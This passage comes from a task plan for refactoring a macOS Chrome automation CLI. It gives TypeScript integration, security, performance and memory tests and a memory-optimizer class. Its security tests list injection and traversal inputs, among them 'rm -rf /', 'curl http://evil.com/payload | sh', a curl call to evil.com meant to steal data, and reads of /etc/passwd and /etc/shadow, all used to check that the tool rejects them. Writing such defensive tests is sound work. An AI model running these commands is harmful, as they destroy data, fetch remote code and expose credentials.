        if (state.applescript && state.automation) {
          expect(result.success).toBe(true);
          expect(result.data.overall).toBeOneOf(['ok', 'warnings']);
        } else {
          expect(result.success).toBe(true);
          expect(result.data.overall).toBe('errors');
          expect(result.data.permissions.some(p => !p.granted)).toBe(true);
        }
      });
      
      it('should handle snapshot command based on permissions', async () => {
        const result = await runCommand('snapshot', ['outline']);
        
        if (state.applescript && state.automation) {
          expect(result.success).toBe(true);
        } else {
          expect(result.success).toBe(false);
          expect(result.code).toBe(ERROR_CODES.PERMISSION_DENIED);
          expect(result.error).toContain('permission');
        }
      });
      
      it('should handle screenshot command based on screen recording permission', async () => {
        const result = await runCommand('shot', ['viewport', '--out', '/tmp/test.png']);
        
        if (state.applescript && state.automation && state.screenRecording) {
          expect(result.success).toBe(true);
          expect(fs.existsSync('/tmp/test.png')).toBe(true);
        } else {
          expect(result.success).toBe(false);
          if (!state.screenRecording) {
            expect(result.error).toContain('screen recording');
          } else {
            expect(result.error).toContain('permission');
          }
        }
      });
      
      it('should provide appropriate error messages and recovery guidance', async () => {
        const result = await runCommand('snapshot', ['outline']);
        
        if (!result.success) {
          expect(result.error).toContain('System Preferences');
          expect(result.error).toMatch(/(Privacy|Security)/);
          
          // Should provide specific guidance based on missing permissions
          if (!state.applescript) {
            expect(result.error).toContain('AppleScript');
          }
          if (!state.automation) {
            expect(result.error).toContain('Automation');
          }
        }
      });
    });
  });
});
```

3. Add automated security scanning:
```typescript
// test/security/vulnerability-scan.test.ts
describe('Security Vulnerability Scanning', () => {
  describe('Input Validation Security', () => {
    it('should prevent AppleScript injection attacks', async () => {
      const maliciousInputs = [
        '"; do shell script "rm -rf /"',
        '\'; tell application "System Events" to shutdown',
        '\\"; osascript -e "beep"',
        '$(rm -rf /tmp/*)',
        '`curl evil.com/steal-data`'
      ];
      
      for (const maliciousInput of maliciousInputs) {
        // Test DOM evaluation
        const domResult = await runCommand('dom', ['eval', '--js', maliciousInput]);
        if (domResult.success) {
          // If successful, ensure no dangerous code was executed
          expect(domResult.data.result).not.toContain('shell script');
          expect(domResult.data.result).not.toContain('system events');
        } else {
          // Should fail with security error
          expect(domResult.code).toBe(ERROR_CODES.SECURITY_VIOLATION);
        }
        
        // Test file operations
        const fileResult = await runCommand('files', ['upload', '--selector', 'input', '--path', maliciousInput]);
        expect(fileResult.success).toBe(false);
        expect(fileResult.code).toBeOneOf([ERROR_CODES.INVALID_PATH, ERROR_CODES.SECURITY_VIOLATION]);
      }
    });
    
    it('should prevent path traversal attacks in file operations', async () => {
      const traversalPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        '../../../../usr/bin/sudo',
        '~/../../../../../../var/log/system.log'
      ];
      
      for (const path of traversalPaths) {
        const result = await runCommand('files', ['upload', '--selector', 'input[type=file]', '--path', path]);
        expect(result.success).toBe(false);
        expect(result.code).toBeOneOf([
          ERROR_CODES.INVALID_PATH,
          ERROR_CODES.SECURITY_VIOLATION,
          ERROR_CODES.FILE_NOT_FOUND
        ]);
        expect(result.error).toMatch(/(traversal|security|invalid path)/i);
      }
    });
    
    it('should sanitize sensitive data in network logs', async () => {
      // Start network monitoring
      await runCommand('netlog', ['start']);
      
      // Simulate requests with sensitive data
      await runCommand('dom', ['eval', '--js', `
        fetch('/api/login', {
          method: 'POST',
          headers: {
            'Authorization': 'Bearer secret-token-12345',
            'X-API-Key': 'api-key-67890',
            'Cookie': 'session=abc123; auth=xyz789'
          },
          body: JSON.stringify({
            username: 'user@test.com',
            password: 'secret-password',
            api_key: 'another-secret-key'
          })
        });
      `]);
      
      await runCommand('wait', ['--ms', '2000']);
      
      // Get network logs
      const netResult = await runCommand('netlog', ['dump', '--format', 'json']);
      expect(netResult.success).toBe(true);
      
      // Verify sensitive data is sanitized
      const logString = JSON.stringify(netResult.data);
      expect(logString).not.toContain('secret-token-12345');
      expect(logString).not.toContain('api-key-67890');
      expect(logString).not.toContain('secret-password');
      expect(logString).not.toContain('another-secret-key');
      
      // Verify sanitization markers are present
      expect(logString).toContain('[REDACTED]');
      
      await runCommand('netlog', ['stop']);
    });
  });
  
  describe('System Security', () => {
    it('should prevent unauthorized system access attempts', async () => {
      const systemCommands = [
        'do shell script "sudo cat /etc/passwd"',
        'tell application "Terminal" to do script "rm -rf /"',
        'mount volume "smb://attacker.com/malware"',
        'do shell script "curl http://evil.com/payload | sh"'
      ];
      
      for (const cmd of systemCommands) {
        // These should be blocked by AppleScript validation
        const result = await executeAppleScript(cmd);
        expect(result.success).toBe(false);
        expect(result.code).toBeOneOf([
          ERROR_CODES.SECURITY_VIOLATION,
          ERROR_CODES.INVALID_INPUT,
          ERROR_CODES.PERMISSION_DENIED
        ]);
      }
    });
    
    it('should validate all external dependencies for known vulnerabilities', async () => {
      // Run npm audit equivalent check
      const packageJson = await fs.readJSON('package.json');
      const dependencies = { ...packageJson.dependencies, ...packageJson.devDependencies };
      
      // Check against known vulnerability database
      const vulnerabilities = await checkVulnerabilities(dependencies);
      
      // Should have no high or critical vulnerabilities
      const criticalVulns = vulnerabilities.filter(v => ['high', 'critical'].includes(v.severity));
      expect(criticalVulns).toHaveLength(0);
      
      if (criticalVulns.length > 0) {
        console.error('Critical vulnerabilities found:', criticalVulns);
      }
    });
  });
});

// Security scanning utilities
async function checkVulnerabilities(dependencies: Record<string, string>): Promise<VulnerabilityReport[]> {
  // Integration with security scanning APIs (npm audit, Snyk, etc.)
  const vulnerabilities: VulnerabilityReport[] = [];
  
  for (const [name, version] of Object.entries(dependencies)) {
    // Check each dependency against vulnerability databases
    const vulns = await queryVulnerabilityDatabase(name, version);
    vulnerabilities.push(...vulns);
  }
  
  return vulnerabilities;
}
```

4. Add performance regression testing:
```typescript
// test/performance/regression.test.ts
describe('Performance Regression Testing', () => {
  const performanceTargets = {
    'snapshot.outline': 300, // ms
    'shot.viewport': 600,    // ms  
    'mouse.click': 500,      // ms
    'dom.eval': 1000,        // ms
    'startup': 100           // ms
  };
  
  beforeAll(async () => {
    // Warm up caches and establish baseline
    await warmUpSystem();
  });
  
  Object.entries(performanceTargets).forEach(([operation, targetMs]) => {
    it(`should complete ${operation} within ${targetMs}ms`, async () => {
      const iterations = 5;
      const timings: number[] = [];
      
      for (let i = 0; i < iterations; i++) {
        const startTime = performance.now();
        
        let result;
        switch (operation) {
          case 'snapshot.outline':
            result = await runCommand('snapshot', ['outline']);
            break;
          case 'shot.viewport':
            result = await runCommand('shot', ['viewport', '--out', `/tmp/perf-test-${i}.png`]);
            break;
          case 'mouse.click':
            result = await runCommand('mouse', ['click', '--selector', 'body']);
            break;
          case 'dom.eval':
            result = await runCommand('dom', ['eval', '--js', 'document.title']);
            break;
          case 'startup':
            result = await measureStartupTime();
            break;
        }
        
        const endTime = performance.now();
        const duration = endTime - startTime;
        
        if (result?.success !== false) { // Allow for expected failures in some tests
          timings.push(duration);
        }
        
        // Brief pause between iterations
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
      expect(timings.length).toBeGreaterThan(0);
      
      // Calculate statistics
      const avgTime = timings.reduce((a, b) => a + b, 0) / timings.length;
      const maxTime = Math.max(...timings);
      const minTime = Math.min(...timings);
      
      // Performance assertions
      expect(avgTime).toBeLessThan(targetMs);
      expect(maxTime).toBeLessThan(targetMs * 2); // Allow 2x variance for max
      
      console.log(`${operation}: avg=${avgTime.toFixed(1)}ms, min=${minTime.toFixed(1)}ms, max=${maxTime.toFixed(1)}ms`);
    });
  });
  
  it('should not have memory leaks during repeated operations', async () => {
    const initialMemory = process.memoryUsage();
    
    // Perform many operations
    for (let i = 0; i < 50; i++) {
      await runCommand('snapshot', ['outline']);
      await runCommand('dom', ['eval', '--js', 'document.title']);
      
      // Force garbage collection every 10 operations
      if (i % 10 === 0 && global.gc) {
        global.gc();
      }
    }
    
    // Force final garbage collection
    if (global.gc) global.gc();
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    const finalMemory = process.memoryUsage();
    const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
    
    // Memory increase should be reasonable (less than 50MB)
    expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024);
    
    console.log(`Memory increase: ${(memoryIncrease / 1024 / 1024).toFixed(1)}MB`);
  });
});
```

**Acceptance Criteria**:
- [ ] Full end-to-end testing covers complete user workflows from start to finish
- [ ] Cross-command integration testing verifies proper command coordination  
- [ ] Permission scenario testing validates behavior across all macOS permission states
- [ ] Security vulnerability scanning catches injection attacks and traversal attempts
- [ ] Performance regression testing ensures no degradation of response times
- [ ] All security tests verify sensitive data is properly sanitized
- [ ] Memory leak testing confirms stable memory usage during repeated operations
- [ ] Integration tests run reliably in CI environment with consistent results

### Task 4.2: Final Performance Validation and Memory Optimization
**Description**: Perform comprehensive performance profiling, memory leak detection, and cache effectiveness analysis with optimization implementation
**Size**: Medium
**Priority**: Medium  
**Dependencies**: None
**Can run parallel with**: Task 4.1

**Technical Requirements**:
- Memory leak detection across all service components
- Performance profiling to identify bottlenecks and optimization opportunities  
- Cache effectiveness analysis with hit rate optimization
- Resource cleanup validation for proper disposal of system resources
- Benchmark validation against original performance targets

**Implementation**:

1. Create comprehensive performance profiling:
```typescript
// test/performance/profiling.test.ts
describe('Performance Profiling and Optimization', () => {
  describe('Memory Usage Analysis', () => {
    it('should maintain stable memory usage across extended operation', async () => {
      const memorySnapshots: NodeJS.MemoryUsage[] = [];
      const operations = 100;
      
      // Take initial memory snapshot
      if (global.gc) global.gc();
      memorySnapshots.push(process.memoryUsage());
      
      // Perform extended operations
      for (let i = 0; i < operations; i++) {
        // Mixed operation types to test different code paths
        switch (i % 5) {
          case 0:
            await runCommand('snapshot', ['outline']);
            break;
          case 1:
            await runCommand('dom', ['eval', '--js', 'document.title']);
            break;
          case 2:
            await runCommand('shot', ['viewport', '--out', `/tmp/prof-${i}.png`]);
            break;
          case 3:
            await runCommand('scroll', ['position']);
            break;
          case 4:
            await runCommand('wait', ['--ms', '100']);
            break;
        }
        
        // Take memory snapshots every 20 operations
        if (i % 20 === 0) {
          if (global.gc) global.gc();
          await new Promise(resolve => setTimeout(resolve, 100));
          memorySnapshots.push(process.memoryUsage());
        }
      }
      
      // Final cleanup and snapshot
      if (global.gc) global.gc();
      await new Promise(resolve => setTimeout(resolve, 1000));
      memorySnapshots.push(process.memoryUsage());
      
      // Analyze memory growth
      const initialHeap = memorySnapshots[0].heapUsed;
      const finalHeap = memorySnapshots[memorySnapshots.length - 1].heapUsed;
      const maxHeap = Math.max(...memorySnapshots.map(s => s.heapUsed));
      
      const growthMB = (finalHeap - initialHeap) / 1024 / 1024;
      const peakMB = maxHeap / 1024 / 1024;
      
      console.log(`Memory analysis: Initial: ${(initialHeap/1024/1024).toFixed(1)}MB, Final: ${(finalHeap/1024/1024).toFixed(1)}MB, Peak: ${peakMB.toFixed(1)}MB, Growth: ${growthMB.toFixed(1)}MB`);
      
      // Assertions
      expect(growthMB).toBeLessThan(20); // Less than 20MB growth
      expect(peakMB).toBeLessThan(150);  // Peak under 150MB
      
      // Memory should not continuously grow
      const midHeap = memorySnapshots[Math.floor(memorySnapshots.length / 2)].heapUsed;
      const lateGrowth = (finalHeap - midHeap) / 1024 / 1024;
      expect(lateGrowth).toBeLessThan(10); // Less than 10MB growth in second half
    });
    
    it('should properly cleanup resources after service shutdown', async () => {
      // Start all services
      const container = new ServiceContainer();
      await container.register(TOKENS.AppleScriptService, new AppleScriptService());
      await container.register(TOKENS.CacheService, new LRUCacheService());
      await container.register(TOKENS.NetworkService, new NetworkService());
      
      await container.startAll();
      
      // Perform operations to allocate resources
      const appleScript = await container.resolve(TOKENS.AppleScriptService);
      const cache = await container.resolve(TOKENS.CacheService);
      
      for (let i = 0; i < 10; i++) {
        await appleScript.execute('tell application "Google Chrome" to get title of tab 1 of window 1');
        await cache.set(`test-key-${i}`, `test-value-${i}`);
      }
      
      const beforeShutdown = process.memoryUsage();
      
      // Shutdown all services
      await container.stopAll();
      await container.dispose();
      
      // Force garbage collection
      if (global.gc) global.gc();
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      const afterShutdown = process.memoryUsage();
      
      // Verify resource cleanup
      const freedMemory = beforeShutdown.heapUsed - afterShutdown.heapUsed;
      expect(freedMemory).toBeGreaterThan(0); // Some memory should be freed
      
      console.log(`Resource cleanup: Freed ${(freedMemory / 1024 / 1024).toFixed(1)}MB`);
    });
  });
  
  describe('Cache Effectiveness Analysis', () => {
    it('should achieve high cache hit rates for repeated operations', async () => {
      const cacheService = new LRUCacheService<string, string>({ max: 50, ttl: 300 });
      await cacheService.start();
      
      // Warm up cache with diverse operations
      const operations = [
        'document.title',
        'document.url',
        'document.readyState',
        'window.location.href',
        'document.querySelectorAll("*").length'
      ];
      
      // First pass - populate cache
      for (const op of operations) {
        for (let i = 0; i < 5; i++) {
          await runCommandWithCache('dom', ['eval', '--js', op], cacheService);
        }
      }
      
      // Reset statistics
      const initialStats = cacheService.getStatistics();
      
      // Second pass - should hit cache
      const iterations = 50;
      for (let i = 0; i < iterations; i++) {
        const op = operations[i % operations.length];
        await runCommandWithCache('dom', ['eval', '--js', op], cacheService);
      }
      
      const finalStats = cacheService.getStatistics();
      const hitRate = finalStats.hitRate;
      const newRequests = finalStats.totalRequests - initialStats.totalRequests;
      
      console.log(`Cache analysis: ${newRequests} requests, ${hitRate.toFixed(1)}% hit rate`);
      
      // Should achieve high hit rate
      expect(hitRate).toBeGreaterThan(70); // > 70% hit rate
      expect(finalStats.currentSize).toBeGreaterThan(0);
      expect(finalStats.totalHits).toBeGreaterThan(finalStats.totalMisses);
      
      await cacheService.stop();
    });
    
    it('should optimize cache eviction for memory efficiency', async () => {
      const smallCache = new LRUCacheService<string, string>({ max: 10, ttl: 60 });
      await smallCache.start();
      
      // Fill cache beyond capacity
      for (let i = 0; i < 20; i++) {
        await smallCache.set(`key-${i}`, `value-${i}`.repeat(1000)); // 1KB values
      }
      
      const stats = smallCache.getStatistics();
      
      // Cache should maintain size limit
      expect(stats.currentSize).toBeLessThanOrEqual(10);
      expect(stats.memoryUsage).toBeLessThan(50000); // Less than 50KB
      
      // Verify LRU eviction
      const recent = await smallCache.get('key-19');
      const old = await smallCache.get('key-0');
      
      expect(recent.success).toBe(true);  // Recent item should be cached
      expect(old.success).toBe(false);    // Old item should be evicted
      
      await smallCache.stop();
    });
  });
  
  describe('Performance Bottleneck Analysis', () => {
    it('should identify and measure performance bottlenecks', async () => {
      const timings: Record<string, number[]> = {
        appleScriptExecution: [],
        javascriptInjection: [],
        coordinateCalculation: [],
        screenshotCapture: [],
        domTraversal: []
      };
      
      // Measure different operation types
      for (let i = 0; i < 10; i++) {
        // AppleScript execution timing
        let start = performance.now();
        await executeAppleScript('tell application "Google Chrome" to get title of tab 1 of window 1');
        timings.appleScriptExecution.push(performance.now() - start);
        
        // JavaScript injection timing
        start = performance.now();
        await executeJavaScript('document.title');
        timings.javascriptInjection.push(performance.now() - start);
        
        // Coordinate calculation timing
        start = performance.now();
        await selectorToScreen('#nonexistent-element', 1); // Will fail but exercise code path
        timings.coordinateCalculation.push(performance.now() - start);
        
        // Screenshot capture timing
        start = performance.now();
        await captureScreenshot({ type: 'viewport', outputPath: `/tmp/timing-${i}.png` });
        timings.screenshotCapture.push(performance.now() - start);
        
        // DOM traversal timing  
        start = performance.now();
        await captureSnapshot({ visibleOnly: true });
        timings.domTraversal.push(performance.now() - start);
      }
      
      // Analyze timing distributions
      Object.entries(timings).forEach(([operation, times]) => {
        const avg = times.reduce((a, b) => a + b, 0) / times.length;
        const min = Math.min(...times);
        const max = Math.max(...times);
        const p95 = times.sort((a, b) => a - b)[Math.floor(times.length * 0.95)];
        
        console.log(`${operation}: avg=${avg.toFixed(1)}ms, min=${min.toFixed(1)}ms, max=${max.toFixed(1)}ms, p95=${p95.toFixed(1)}ms`);
        
        // Performance expectations
        switch (operation) {
          case 'appleScriptExecution':
            expect(avg).toBeLessThan(300);
            expect(p95).toBeLessThan(500);
            break;
          case 'javascriptInjection':
            expect(avg).toBeLessThan(200);
            expect(p95).toBeLessThan(400);
            break;
          case 'coordinateCalculation':
            expect(avg).toBeLessThan(150);
            expect(p95).toBeLessThan(300);
            break;
          case 'screenshotCapture':
            expect(avg).toBeLessThan(600);
            expect(p95).toBeLessThan(1000);
            break;
          case 'domTraversal':
            expect(avg).toBeLessThan(300);
            expect(p95).toBeLessThan(500);
            break;
        }
      });
    });
    
    it('should validate connection pool efficiency', async () => {
      const connectionPool = new ChromeConnectionPool({ maxConnections: 5, connectionTTL: 30000 });
      
      // Simulate concurrent operations requiring connections
      const operations = Array.from({ length: 20 }, (_, i) => 
        executeWithConnectionPool(() => 
          executeAppleScript(`tell application "Google Chrome" to get title of tab 1 of window 1`)
        , connectionPool)
      );
      
      const start = performance.now();
      const results = await Promise.allSettled(operations);
      const totalTime = performance.now() - start;
      
      const successful = results.filter(r => r.status === 'fulfilled').length;
      const poolStats = connectionPool.getStats();
      
      console.log(`Connection pool: ${successful}/${operations.length} successful, ${totalTime.toFixed(1)}ms total, ${poolStats.activeConnections} active`);
      
      // Pool efficiency expectations
      expect(successful).toBeGreaterThan(15); // Most operations should succeed
      expect(poolStats.activeConnections).toBeLessThanOrEqual(5); // Respect connection limit
      expect(totalTime).toBeLessThan(10000); // Complete within 10 seconds
      
      // Average time per operation should be reasonable
      const avgTimePerOperation = totalTime / successful;
      expect(avgTimePerOperation).toBeLessThan(2000); // < 2 seconds per operation on average
    });
  });
});
```

2. Add memory optimization utilities:
```typescript
// src/lib/MemoryOptimizer.ts
export class MemoryOptimizer {
  private static instance: MemoryOptimizer;
  private memoryThreshold = 100 * 1024 * 1024; // 100MB
  private checkInterval = 30000; // 30 seconds
  private intervalId?: NodeJS.Timeout;
  
  static getInstance(): MemoryOptimizer {
    if (!MemoryOptimizer.instance) {
      MemoryOptimizer.instance = new MemoryOptimizer();
    }
    return MemoryOptimizer.instance;
  }
  
  start(): void {
    this.intervalId = setInterval(() => {
      this.performMemoryCheck();
    }, this.checkInterval);
  }
  
  stop(): void {
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = undefined;
    }
  }
  
  private performMemoryCheck(): void {
    const memUsage = process.memoryUsage();
    
    if (memUsage.heapUsed > this.memoryThreshold) {
      console.warn(`High memory usage detected: ${(memUsage.heapUsed / 1024 / 1024).toFixed(1)}MB`);
      this.performOptimization();
    }
  }
  
  private performOptimization(): void {
    // Clear caches
    this.clearCaches();
    
    // Force garbage collection if available
    if (global.gc) {
      global.gc();
    }
    
    // Log memory status after cleanup
    const afterCleanup = process.memoryUsage();
    console.log(`Memory optimization completed: ${(afterCleanup.heapUsed / 1024 / 1024).toFixed(1)}MB`);
  }
  
  private clearCaches(): void {
    // Clear various caches
    if (global.scriptCache) {
      global.scriptCache.clear();
    }
    if (global.coordsCache) {
      global.coordsCache.clear();
    }
  }
  
  getMemoryStats(): MemoryStats {
    const usage = process.memoryUsage();
    return {
      heapUsed: usage.heapUsed,
      heapTotal: usage.heapTotal,
      external: usage.external,
      rss: usage.rss,
      heapUtilization: (usage.heapUsed / usage.heapTotal) * 100
    };
  }
  
  async profileMemoryUsage(operation: () => Promise<any>): Promise<MemoryProfile> {
    const before = process.memoryUsage();
    const start = performance.now();
    
    try {
      const result = await operation();
      const end = performance.now();
      const after = process.memoryUsage();
      
      return {
        success: true,
        duration: end - start,
        memoryDelta: {
          heapUsed: after.heapUsed - before.heapUsed,
          heapTotal: after.heapTotal - before.heapTotal,
          external: after.external - before.external,
          rss: after.rss - before.rss
        },
        result
      };
    } catch (error) {
      const end = performance.now();
      const after = process.memoryUsage();
      
      return {
        success: false,
        duration: end - start,
        memoryDelta: {
          heapUsed: after.heapUsed - before.heapUsed,
          heapTotal: after.heapTotal - before.heapTotal,
          external: after.external - before.external,
          rss: after.rss - before.rss
        },
        error: String(error)
      };
    }
  }
}

interface MemoryStats {
  heapUsed: number;
  heapTotal: number;
  external: number;
  rss: number;
  heapUtilization: number;
}

interface MemoryProfile {
  success: boolean;
  duration: number;
  memoryDelta: {
    heapUsed: number;
    heapTotal: number;
    external: number;
    rss: number;
  };
  result?: any;
  error?: string;
}
```

3. Create performance benchmark validation:
```typescript
// test/performance/benchmark-validation.test.ts
describe('Benchmark Validation', () => {
  const originalTargets = {
    clickElement: 500,      // ms
    type50Chars: 1000,     // ms  
    screenshotViewport: 600, // ms
    snapshotOutline: 300,   // ms
    startup: 100           // ms
  };
  
  it('should meet all original performance targets after refactoring', async () => {
    const results: Record<string, BenchmarkResult> = {};
    
    // Test each performance target
    for (const [operation, targetMs] of Object.entries(originalTargets)) {
      const iterations = 5;
      const timings: number[] = [];
      
      for (let i = 0; i < iterations; i++) {
        const timing = await measureOperation(operation);
        if (timing > 0) timings.push(timing);
      }
      
      const avgTime = timings.reduce((a, b) => a + b, 0) / timings.length;
      const passed = avgTime < targetMs;
      
      results[operation] = {
        target: targetMs,
        actual: avgTime,
        passed,
        improvement: targetMs - avgTime,
        timings
      };
      
      console.log(`${operation}: ${avgTime.toFixed(1)}ms (target: ${targetMs}ms) - ${passed ? 'PASS' : 'FAIL'}`);
    }
    
    // All benchmarks should pass
    Object.values(results).forEach(result => {
      expect(result.passed).toBe(true);
    });
    
    // Calculate overall performance improvement
    const totalImprovement = Object.values(results)
      .reduce((sum, result) => sum + result.improvement, 0);
    
    console.log(`Overall performance improvement: ${totalImprovement.toFixed(1)}ms across all operations`);
    expect(totalImprovement).toBeGreaterThan(0); // Should have some improvement
  });
  
  async measureOperation(operation: string): Promise<number> {
    const start = performance.now();
    
    try {
      switch (operation) {
        case 'clickElement':
          await runCommand('mouse', ['click', '--selector', 'body']);
          break;
        case 'type50Chars':
          await runCommand('keyboard', ['type', '--text', 'x'.repeat(50)]);
          break;
        case 'screenshotViewport':
          await runCommand('shot', ['viewport', '--out', '/tmp/benchmark.png']);
          break;
        case 'snapshotOutline':
          await runCommand('snapshot', ['outline']);
          break;
        case 'startup':
          // Measure CLI startup time
          const { spawn } = await import('child_process');
          const child = spawn('node', ['dist/index.js', '--help'], { stdio: 'pipe' });
          await new Promise(resolve => child.on('close', resolve));
          break;
      }
      
      return performance.now() - start;
    } catch (error) {
      console.warn(`Benchmark ${operation} failed:`, error);
      return -1;
    }
  }
  
  interface BenchmarkResult {
    target: number;
    actual: number;
    passed: boolean;
    improvement: number;
    timings: number[];
  }
});
```

**Acceptance Criteria**:
- [ ] Memory usage remains stable during extended operations (< 20MB growth)
- [ ] All system resources properly cleaned up after service shutdown
- [ ] Cache hit rates achieve 70%+ for repeated operations
- [ ] Performance bottlenecks identified and documented with timing analysis
- [ ] All original performance targets met or exceeded after refactoring
- [ ] Memory optimization prevents heap size from growing beyond reasonable limits
- [ ] Connection pool efficiency maintains reasonable throughput under load
- [ ] No memory leaks detected during automated testing scenarios

## Summary

This comprehensive task breakdown provides a complete roadmap for refactoring the mac-chrome-cli architecture while maintaining all existing functionality. Each task includes:

- **Complete implementation details** copied from the specification
- **Self-contained code examples** that developers can implement directly
- **Comprehensive acceptance criteria** with specific test scenarios
- **Clear dependencies and parallelization opportunities**
- **Performance and security considerations throughout**

The breakdown follows the critical requirement to preserve ALL content from the specification in each task, ensuring that developers have complete information to implement each component without referring back to the original specification.

**Total Tasks**: 13 tasks across 4 phases
**Estimated Timeline**: 6 weeks with proper task parallelization
**Risk Mitigation**: Each phase validates previous work before proceeding
**Quality Assurance**: Comprehensive testing and documentation integrated throughout
